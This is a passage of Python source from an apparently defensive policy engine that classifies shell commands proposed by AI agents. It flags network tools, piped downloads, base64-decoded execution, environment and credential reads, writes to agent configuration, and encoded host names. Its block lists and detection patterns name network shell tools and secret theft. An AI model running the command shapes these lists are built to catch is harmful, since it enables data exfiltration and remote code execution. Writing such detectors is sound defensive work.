        # command text ("watch -n1 'curl https://x'", "env -S 'curl x'"), so it is read as a command line too,
        # with the words after it kept as they were.
        line = " ".join([command.written, *(_quoted(word, command.shell) for word in words)])
        yield from _read(line, command.shell, budget, depth + 1)


def _quoted(word: str, shell: str) -> str:
    """A word quoted so that the shell reads it back as the same single word."""
    if shell == "powershell":
        return "'" + word.replace("'", "''") + "'"
    return "'" + word.replace("'", "'\\''") + "'"


_POSIX_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "csh", "tcsh"})
# Programs that run the command text after -c (or --command) with a shell: su -c 'x', script -qc 'x'.
_DASH_C_RUNNERS = frozenset({"su", "runuser", "script", "sg"})
_POWERSHELLS = frozenset({"powershell", "pwsh"})
# powershell.exe and pwsh options (and the short forms people use) that take a value.
_POWERSHELL_OPTIONS_WITH_VALUE = frozenset({
    "executionpolicy", "ep", "ex", "exec", "windowstyle", "w", "win", "version", "v", "inputformat", "inp", "if",
    "outputformat", "o", "of", "configurationname", "config", "workingdirectory", "wd", "settingsfile",
    "psconsolefile", "custompipename", "encodedcommand", "e", "ec", "en", "enc", "enco", "encodedarguments", "ea",
})


def _shell_script(program: str, words: list[str]) -> tuple[str, str] | None:
    """The command text a shell program is given to run, and that text's shell; None if there is none."""
    if program in _POSIX_SHELLS:
        for index, word in enumerate(words):
            if re.fullmatch(r"-[a-zA-Z]*c[a-zA-Z]*", word) and not word.startswith("--"):
                return (words[index + 1], "bash") if index + 1 < len(words) else None
            if not word.startswith("-"):
                return None  # a script file
        return None
    if program in _DASH_C_RUNNERS:
        # The -c may come after a user or group name (su root -c x, sg staff -c x), so every word is looked at.
        for index, word in enumerate(words):
            if word.startswith("--command="):
                return word.partition("=")[2], "bash"
            if word == "--command" or re.fullmatch(r"-[a-zA-Z]*c", word):
                return (words[index + 1], "bash") if index + 1 < len(words) else None
        return None
    if program in _POWERSHELLS:
        skip = False
        for index, word in enumerate(words):
            if skip:
                skip = False
                continue
            option = word.lstrip("-/").lower() if word[:1] in ("-", "/") else None
            if option is None:
                # powershell.exe reads the rest as a command; pwsh as a script file and its arguments.
                return (" ".join(words[index:]), "powershell") if program == "powershell" else None
            if option in ("c", "command") or (len(option) >= 3 and "command".startswith(option)):
                rest = " ".join(words[index + 1:])
                return (rest, "powershell") if rest and rest != "-" else None
            if option in ("f", "file") or (len(option) >= 2 and "file".startswith(option)):
                return None
            skip = option in _POWERSHELL_OPTIONS_WITH_VALUE
        return None
    if program == "cmd":
        for index, word in enumerate(words):
            if word.lower() in ("/c", "/k", "/r"):
                rest = " ".join(words[index + 1:]).replace("^", "")
                return (rest, "bash") if rest else None
        return None
    return None


# ---- classes --------------------------------------------------------------------------------

_NETWORK_PROGRAMS = frozenset({
    "curl", "wget", "wget2", "aria2c", "nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp", "rsync",
    "ftp", "tftp", "lftp", "ping", "ping6", "nslookup", "dig", "host", "drill", "whois", "traceroute", "tracert",
    "resolve-dnsname", "test-netconnection", "tnc", "iwr", "irm", "invoke-webrequest", "invoke-restmethod",
    "start-bitstransfer", "bitsadmin", "send-mailmessage", "gh", "http", "https", "xh",
})
# Programs that download, for "a download piped to a shell".
_DOWNLOADERS = frozenset({"curl", "wget", "wget2", "aria2c", "iwr", "irm", "invoke-webrequest", "invoke-restmethod",
                          "http", "https", "xh", "certutil", "bitsadmin"})
# Programs that run the text they are given (on stdin, or as a file a substitution names).
_INTERPRETERS = _POSIX_SHELLS | _POWERSHELLS | frozenset({
    "python", "python3", "py", "node", "deno", "bun", "perl", "ruby", "php", "lua", "iex", "invoke-expression",
    "cmd", "source", ".",
})
_GIT_NETWORK = frozenset({"push", "clone", "fetch", "pull", "ls-remote", "send-email", "request-pull"})
_GIT_OPTIONS_WITH_VALUE = frozenset({"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path"})
# Package managers: the subcommands that install or run a package.
_PACKAGE_INSTALL = {
    "npm": frozenset({"install", "i", "in", "ins", "inst", "add", "ci", "clean-install", "install-test", "it",
                      "exec", "x", "create", "install-ci-test", "cit"}),
    "pnpm": frozenset({"install", "i", "add", "dlx", "create", "install-test", "it"}),
    "yarn": frozenset({"install", "add", "dlx", "create"}),
    "bun": frozenset({"install", "i", "add", "x", "create"}),
    "cnpm": frozenset({"install", "i", "add"}),
    "pip": frozenset({"install", "download"}),
    "pipx": frozenset({"run", "install", "inject", "upgrade"}),
    "gem": frozenset({"install"}),
    "cargo": frozenset({"install"}),
    "go": frozenset({"install", "get"}),
    "brew": frozenset({"install", "reinstall", "tap"}),
    "apt": frozenset({"install"}),
    "apt-get": frozenset({"install"}),
    "winget": frozenset({"install"}),
    "choco": frozenset({"install"}),
    "scoop": frozenset({"install"}),
    "conda": frozenset({"install", "create"}),
    "mamba": frozenset({"install", "create"}),
}
_PACKAGE_OPTIONS_WITH_VALUE = frozenset({"--prefix", "-C", "--dir", "--cwd", "-w", "--workspace", "--filter", "-F",
                                         "--registry"})
_RUNNERS = frozenset({"npx", "pnpx", "bunx", "uvx", "iex", "invoke-expression", "install-package", "install-module",
                      "install-script"})
_PYTHONS = re.compile(r"(python|py)([0-9.]*|w)")
_PIPS = re.compile(r"pip[0-9.]*")
# python -m <module> for these runs that package manager.
_PYTHON_PACKAGE_MODULES = re.compile(r"(pip[0-9.]*|pipx|uv)")
# deno subcommands that run or install code; run, compile and cache count when they name a remote module.
_DENO_INSTALL = frozenset({"install", "i", "add", "x"})
_DENO_RUN = frozenset({"run", "compile", "cache", "bundle", "test", "eval"})
_REMOTE_MODULE = re.compile(r"(https?|npm|jsr):", re.IGNORECASE)
_PROGRAM_WRITERS = frozenset({
    "tee", "cp", "mv", "ln", "install", "touch", "truncate", "rm", "unlink", "dd", "chmod", "chown", "rsync",
    "set-content", "sc", "add-content", "ac", "out-file", "new-item", "ni", "copy-item", "copy", "cpi", "move-item",
    "move", "mi", "remove-item", "ri", "del", "erase", "rename-item", "ren", "rni", "set-itemproperty",
    "tee-object", "export-csv", "export-clixml", "xcopy", "robocopy",
})
# .NET file writes in PowerShell words: [IO.File]::WriteAllText(...), [IO.File]::Copy(...), a StreamWriter.
_DOTNET_WRITE = re.compile(
    r"::(write\w*|append\w*|create\w*|copy|move|replace|open|openwrite)\b|streamwriter|filestream",
    re.IGNORECASE,
)
# The PowerShell profile, which PowerShell runs at every start: $PROFILE, $PROFILE.CurrentUserAllHosts ...
_PROFILE_VARIABLE = re.compile(r"\$\{?profile\b", re.IGNORECASE)
# Bash opens a network connection for a redirection to /dev/tcp/<host>/<port> or /dev/udp/<host>/<port>.
_DEV_SOCKET = re.compile(r"(?:^|[<>&])/dev/(?:tcp|udp)/([^/\s]*)")
_ROUNDABOUT_PATH = re.compile(ROUNDABOUT_PATH_PATTERN)
_IN_PLACE_EDITORS = frozenset({"sed", "perl", "ruby"})
_ENV_LISTERS = frozenset({"get-childitem", "gci", "dir", "ls", "get-item", "gi", "get-content", "gc", "cat", "type"})
_DECODERS = frozenset({"base64", "openssl", "xxd", "certutil"})
# .NET calls in PowerShell words.
_DOTNET_NETWORK = re.compile(
    r"net\.webclient|httpclient|downloadstring|downloadfile|downloaddata|uploadstring|uploadfile|uploaddata|"
    r"uploadvalues|net\.sockets|\[(system\.)?net\.dns\]|webrequest\]::create",
    re.IGNORECASE,
)
_DOTNET_DECODE = re.compile(r"frombase64string", re.IGNORECASE)
_DOTNET_ENVIRONMENT = re.compile(r"\[(system\.)?environment\]::getenvironmentvariables", re.IGNORECASE)

_SECRET_WORD = re.compile(f"{CREDENTIAL_PATTERN}|{AGENT_CONFIG_PATTERN}|{AGENT_SENTINEL_HOME_PATTERN}|"
                          r"(^|[\s\\/:@='\"`<>|;&(,{])\.agent-sentinel([\\/]|$)", re.IGNORECASE)
_PROTECTED_TARGET = re.compile(
    f"{CREDENTIAL_PATTERN}|{AGENT_CONFIG_PATTERN}|{AGENT_SENTINEL_HOME_PATTERN}|"
    r"(^|[\s\\/:@='\"`<>|;&(,{])\.(claude|cursor|codeium|gemini|codex|agent-sentinel)([\\/]|$)",
    re.IGNORECASE,
)

# The host part of a URL, and a word that is a host name (with a user, a port or an scp path).
_URL_HOST = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://(?:[^/?#@\s]*@)?([^/?#:\s]*)")
_BARE_HOST = re.compile(r"(?:[^@\s/:]+@)?([A-Za-z0-9\x00_-]+(?:\.[A-Za-z0-9\x00_-]+)+)\.?(?::\S*)?")
_HEX_LABEL = re.compile(r"[0-9a-f]{16,}")
_BASE32_LABEL = re.compile(r"[a-z2-7]{20,}")
_LONG_LABEL = 32


def _findings(commands: list[_Command]) -> Iterator[Finding]:
    """Every class each command falls into, with the evidence."""
    pipelines: dict[int, list[_Command]] = {}
    for command in commands:
        pipelines.setdefault(command.pipeline, []).append(command)
    found: list[Finding] = []
    for command in commands:
        earlier = [other for other in pipelines[command.pipeline] if other.position < command.position]
        found.extend(_command_findings(command, earlier))
    network_anywhere = any(finding.kind == NETWORK for finding in found)
    for command in commands:
        # bash <(curl ...), sh -c "$(curl ...)", source <(wget ...): a download run as a script.
        if network_anywhere and command.program in _INTERPRETERS and any(_SUBST in word for word in command.words):
            found.append(_finding(INSTALL, command, f"program '{command.program}' runs a command's output"))
    yield from found


def _finding(kind: str, command: _Command, evidence: str) -> Finding:
    words = tuple(word.lower() for word in command.words[:4])
    return Finding(kind, command.program, words, printable(evidence, limit=120))


def _command_findings(command: _Command, earlier: list[_Command]) -> list[Finding]:
    found = []
    for kind, check in ((NETWORK, _network), (INSTALL, _install), (SECRET_READ, _secret_read),
                        (CONFIG_WRITE, _config_write), (OBFUSCATION, _obfuscation)):
        evidence = check(command, earlier)
        if evidence:
            found.append(_finding(kind, command, evidence))
    if any(finding.kind == NETWORK for finding in found):
        evidence = _encoded_host(command)
        if evidence:
            found.append(_finding(ENCODED_HOST, command, evidence))
    return found


def _positional(words: Iterable[str], with_value: frozenset[str] = frozenset()) -> list[str]:
    """The words that are not options, skipping the value of an option that takes one."""
    found = []
    skip = False
    for word in words:
        if skip:
            skip = False
            continue
        if word.startswith("-") and word != "-":
            skip = word in with_value
            continue
        found.append(word)
    return found


def _network(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, command.words
    if program in _NETWORK_PROGRAMS:
        return f"program '{program}'"
    if program == "certutil" and any(word.lstrip("-/").lower() in ("urlcache", "verifyctl") for word in words):
        return "program 'certutil' with -urlcache"
    if program == "git":
        positional = _positional(words, _GIT_OPTIONS_WITH_VALUE)
        if positional and positional[0].lower() in _GIT_NETWORK:
            return f"'git {positional[0].lower()}'"
        if positional[:2] in (["remote", "update"], ["submodule", "update"]):
            return f"'git {' '.join(positional[:2])}'"
    if program in ("npm", "pnpm", "yarn") and _subcommand(words) in ("publish", "unpublish"):
        return f"'{program} {_subcommand(words)}'"
    for word in (*words, *command.targets):
        if _DEV_SOCKET.search(word):
            return f"a connection through '{word}'"
    if command.shell == "powershell":
        for word in (program, *words):
            if _DOTNET_NETWORK.search(word):
                return f"a .NET network call in '{word}'"
    return None


def _subcommand(words: Iterable[str]) -> str:
    positional = _positional(words, _PACKAGE_OPTIONS_WITH_VALUE)
    return positional[0].lower() if positional else ""


def _python_module(words: list[str]) -> tuple[str, list[str]] | None:
    """The module of "python [options] -m <module> ..." (py -3 -m pip, python -I -m pip), and the words after it."""
    i = 0
    while i < len(words):
        word = words[i]
        found = re.fullmatch(r"-[A-Za-z]*m(.*)", word) if not word.startswith("--") else None
        if found:
            if found.group(1):
                return found.group(1).lower(), words[i + 1:]  # -mpip
            return (words[i + 1].lower(), words[i + 2:]) if i + 1 < len(words) else None
        if word.startswith("-c") or not word.startswith("-") or word == "-":
            return None  # inline code, a script or stdin: no module
        i += 2 if word in ("-W", "-X", "--check-hash-based-pycs") else 1
    return None


def _install(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, list(command.words)
    if program in _RUNNERS:
        return f"program '{program}'"
    name = "pip" if _PIPS.fullmatch(program) else program
    module = _python_module(words) if _PYTHONS.fullmatch(program) else None
    if module and _PYTHON_PACKAGE_MODULES.fullmatch(module[0]):
        name, words = ("pip" if module[0].startswith("pip") and module[0] != "pipx" else module[0]), module[1]
        program = name
    if program == "deno":
        positional = _positional(words)
        sub = positional[0].lower() if positional else ""
        if sub in _DENO_INSTALL or sub in _DENO_RUN and any(_REMOTE_MODULE.match(word) for word in positional[1:]):
            return f"'deno {sub}'"
    if name in _PACKAGE_INSTALL:
        sub = _subcommand(words)
        if sub in _PACKAGE_INSTALL[name] or (name == "yarn" and sub in ("", "global")):
            return f"'{name} {sub}'" if sub else f"'{name}'"
        if name == "npm" and sub == "init" and len(_positional(words)) > 1:
            return "'npm init <package>'"
    if program == "uv":
        positional = [word.lower() for word in _positional(words)]
        if positional[:2] in (["pip", "install"], ["tool", "install"], ["tool", "run"]) or positional[:1] == ["add"]:
            return f"'uv {' '.join(positional[:2])}'"
    if program in _INTERPRETERS and any(other.program in _DOWNLOADERS for other in earlier):
        return f"a download piped to '{program}'"
    return None


def _spellings(word: str) -> Iterator[str]:
    """A word, and what a file check must also see in it: its comma-separated parts (a PowerShell list,
    'a','b') and the plain form of a path written in a roundabout way (.claude/./settings.json)."""
    yield word
    parts = [part for part in word.split(",") if part] if "," in word else [word]
    for part in parts:
        if part is not word:
            yield part
        if _ROUNDABOUT_PATH.search(part):
            yield posixpath.normpath(part.replace("\\", "/"))


def _named_files(command: _Command) -> Iterator[str]:
    """Every word of a command that may name a file it reads: the program's own word, its words, its
    redirections and the words of its PowerShell groups."""
    for word in (command.written, *command.words, *command.targets, *command.groups):
        yield from _spellings(word)


def _secret_read(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, command.words
    for word in _named_files(command):
        if _SECRET_WORD.search(word):
            return f"word '{word}'"
    positional = _positional(words)
    if program == "printenv":
        return "program 'printenv'"
    if program == "env" and not [word for word in positional if not _ASSIGNMENT.match(word)]:
        return "program 'env' with no command"
    if program == "set" and command.shell == "bash" and not words:
        return "program 'set' with no arguments"
    if program == "export" and all(word == "-p" for word in words):
        return "program 'export' with no names"
    if program in ("declare", "typeset") and words and not positional and all(
            set(word[1:]) <= set("px") for word in words):
        return f"program '{program}' listing variables"
    if program in _ENV_LISTERS and any(word.lower().startswith("env:") for word in words):
        return f"program '{program}' with env:"
    if command.shell == "powershell" and any(_DOTNET_ENVIRONMENT.search(word) for word in (program, *words)):
        return "[Environment]::GetEnvironmentVariables"
    return None


def _protected(word: str) -> bool:
    """True if a word a command writes to names an agent's configuration, a credential file or $PROFILE."""
    return any(_PROTECTED_TARGET.search(spelling) or _PROFILE_VARIABLE.match(spelling)
               for spelling in _spellings(word))


def _write_targets(words: Iterable[str]) -> Iterator[str]:
    """The words a writing program may write to: those that are not options, and the values of options
    written with them (--target-directory=x, -Destination:x)."""
    for word in words:
        if word.startswith("-") and word != "-":
            value = re.split(r"[=:]", word, maxsplit=1)[1:]
            if value and value[0]:
                yield value[0]
        else:
            yield word


def _config_write(command: _Command, earlier: list[_Command]) -> str | None:
    for target in command.targets:
        if _protected(target):
            return f"a redirection to '{target}'"
    program, words = command.program, command.words
    writes = program in _PROGRAM_WRITERS or (
        program in _IN_PLACE_EDITORS and any(word.startswith(("-i", "--in-place", "-pi")) for word in words)) or (
        command.shell == "powershell" and any(_DOTNET_WRITE.search(word) for word in (command.written, *words)))
    if writes:
        for word in (*_write_targets(words), *command.groups):
            if _protected(word):
                return f"program '{program or command.written}' with '{word}'"
    return None


def _obfuscation(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, command.words
    if program == "eval":
        return "program 'eval'"
    if program in ("iex", "invoke-expression"):
        return f"program '{program}'"
    if program in _POWERSHELLS:
        for word in words:
            if word[:1] in ("-", "/"):
                option = word.lstrip("-/").lower()
                if option == "ec" or (option.startswith("e") and "encodedcommand".startswith(option)):
                    return f"program '{program}' with {word}"
    if program in _POSIX_SHELLS:
        script = _shell_script(program, list(words))
        if script is not None and (_SUBST in script[0] or "$(" in script[0] or "`" in script[0]):
            return f"program '{program} -c' with a command substitution"
    if program in _INTERPRETERS and any(_decodes(other) for other in earlier):
        return f"decoded text piped to '{program}'"
    if command.shell == "powershell" and any(_DOTNET_DECODE.search(word) for word in (program, *words)):
        return "[Convert]::FromBase64String"
    return None


def _decodes(command: _Command) -> bool:
    """base64 -d, openssl base64 -d, xxd -r, certutil -decode: text turned back into what it hid."""
    words = [word.lower() for word in command.words]
    if command.program == "base64":
        return any(word in ("-d", "--decode", "-D") or re.fullmatch(r"-[a-z]*d[a-z]*", word) for word in words)
    if command.program == "openssl":
        return "-d" in words
    if command.program == "xxd":
        return any(word.startswith("-r") for word in words)
    if command.program == "certutil":
        return any(word.lstrip("-/") in ("decode", "decodehex") for word in words)
    return False


def _encoded_host(command: _Command) -> str | None:
    """A host name in a network command's words that looks like it carries data."""
    for word in (*command.words, *command.targets):
        if word.startswith("-"):
            word = word.partition("=")[2]
            if not word:
                continue
        socket = _DEV_SOCKET.search(word)
        found = _URL_HOST.match(word)
        host = socket.group(1) if socket else found.group(1) if found else None
        if host is None:
            bare = _BARE_HOST.fullmatch(word)
            host = bare.group(1) if bare else None
        if not host:
            continue
        for label in host.lower().split("."):
            why = _encoded_label(label)
            if why:
                return f"host '{host}': {why}"
    return None


def _encoded_label(label: str) -> str | None:
    if _SUBST in label:
        return "a label built from a command's output"
    if len(label) >= _LONG_LABEL:
        return f"a label of {len(label)} characters"
    has_digit = any(ch.isdigit() for ch in label)
    has_letter = any(ch.isalpha() for ch in label)
    if has_digit and has_letter and (_HEX_LABEL.fullmatch(label) or _BASE32_LABEL.fullmatch(label)):
        return "a label that looks like hex or base32"
    return None


# ---- the policy's "command" section ------------------------------------------------------------

@dataclass(frozen=True)
class CommandRule:
    """A tool rule's "command" section: how the classes of its command argument are treated.

    {"arg": "command", "shell": "bash", "deny_classes": ["obfuscation"], "ask_classes": ["network"],
     "allow_programs": ["git push"], "labels_by_class": {"network": ["sink"]}, "unreadable": "ask"}

    deny_classes     a command in one of these classes is refused
    ask_classes      ... is sent to a person for approval
    allow_programs   "curl" or "git push": a simple command whose program (and first words) match
                     is not counted as network or install (the word classes still count)
    labels_by_class  flow labels the call gets when its command is in the class; an unreadable
                     command gets all of them
    unreadable       "ask" (the default) or "block": what happens to a command that cannot be read,
                     when deny_classes or ask_classes name any class
    """

    arg: str = "command"
    shell: str = "bash"
    deny_classes: tuple[str, ...] = ()
    ask_classes: tuple[str, ...] = ()
    allow_programs: tuple[tuple[str, ...], ...] = ()
    labels_by_class: tuple[tuple[str, tuple[str, ...]], ...] = ()
    unreadable: str = "ask"

    def __post_init__(self) -> None:
        if self.shell not in SHELLS:
            raise ValueError(f"shell must be one of {SHELLS}")
        if self.unreadable not in ("ask", "block"):
            raise ValueError("unreadable must be 'ask' or 'block'")
        for kind in (*self.deny_classes, *self.ask_classes, *(kind for kind, _ in self.labels_by_class)):
            if kind not in CLASSES:
                raise ValueError(f"unknown command class {kind!r}")

    @property
    def judges(self) -> bool:
        """True if some class is refused or asked about (then an unreadable command is too)."""
        return bool(self.deny_classes or self.ask_classes)

    def reading(self, args: Any) -> Reading:
        """The reading of the command argument (its name compared ignoring case, as deny_args do)."""
        if not isinstance(args, dict):
            return Reading(unreadable="the arguments are not an object")
        wanted = self.arg.casefold()
        values = [value for name, value in args.items() if isinstance(name, str) and name.casefold() == wanted]
        if len(values) != 1:
            return Reading(unreadable="the command argument is missing" if not values else
                           "the command argument is given twice")
        return read_command(values[0], self.shell)

    def found(self, reading: Reading) -> dict[str, Finding]:
        """The classes of a reading, after allow_programs: class -> its first finding."""
        kinds: dict[str, Finding] = {}
        for finding in reading.findings:
            if finding.kind in kinds:
                continue
            if finding.kind in PROGRAM_CLASSES and self._allowed_program(finding):
                continue
            kinds[finding.kind] = finding
        return kinds

    def _allowed_program(self, finding: Finding) -> bool:
        for entry in self.allow_programs:
            if entry[0] == finding.program and tuple(finding.words[:len(entry) - 1]) == entry[1:]:
                return True
        return False

    def labels(self, args: Any) -> frozenset[str]:
        """The flow labels a call with these arguments gets from labels_by_class."""
        if not self.labels_by_class:
            return frozenset()
        reading = self.reading(args)
        if reading.unreadable is not None:
            return frozenset(label for _, labels in self.labels_by_class for label in labels)
        kinds = self.found(reading)
        return frozenset(label for kind, labels in self.labels_by_class if kind in kinds for label in labels)

    def describe(self) -> str:
        """What this section checks, for the operator."""
        parts = []
        if self.deny_classes:
            parts.append(f"refuses {', '.join(self.deny_classes)}")
        if self.ask_classes:
            parts.append(f"asks for {', '.join(self.ask_classes)}")
        if self.judges:
            parts.append(f"an unreadable command: {self.unreadable}")
        if self.allow_programs:
            parts.append(f"except programs {', '.join(' '.join(entry) for entry in self.allow_programs)}")
        if self.labels_by_class:
            parts.append("labels " + "; ".join(f"{kind}: {', '.join(labels)}" for kind, labels in self.labels_by_class))
        return f"{self.shell} command in argument '{self.arg}': " + ("; ".join(parts) or "read only")


def allow_program_entry(text: str) -> tuple[str, ...] | None:
    """An allow_programs entry ("git push") as words, the program normalised; None if it is not usable."""
    words = text.split()
    if not words or len(words) > 8 or any(ch in text for ch in "\"'`$\\;|&<>()"):
        return None
    return (_program_name(words[0]), *(word.lower() for word in words[1:]))
